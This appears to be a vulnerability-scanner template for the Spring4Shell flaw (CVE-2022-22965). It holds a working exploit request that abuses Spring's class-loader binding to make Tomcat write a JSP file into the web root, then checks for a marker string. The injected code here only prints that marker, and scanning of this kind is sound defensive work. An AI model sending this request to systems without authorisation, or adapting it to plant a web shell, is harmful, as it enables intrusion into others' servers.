id: CVE-2022-22965
info:
  author: justmumu
  classification:
    cve-id: CVE-2022-22965
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-770
  description: CVE-2022-22965 - Spring Core Remote Code Execution Vulnerability
  name: CVE-2022-22965 - Spring4Shell RCE Vulnerability
  severity: critical
  tags: cve,rce,spring,cve2022,injection
requests:
- body: class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(%22j%22))%7B%20out.println(new%20String(%22exploitable%22))%3B%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=checkexploit&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
  headers:
    Content-Type: application/x-www-form-urlencoded
    c2: <%
    suffix: '%>'
  method: POST
  path:
  - '{{BaseURL}}'
  redirects: false
- headers:
    1: '{{wait_for(5)}}'
  matchers:
  - dsl:
    - status_code==200 && contains(body, 'exploitable')
    type: dsl
  method: GET
  path:
  - '{{RootURL}}/checkexploit.jsp'
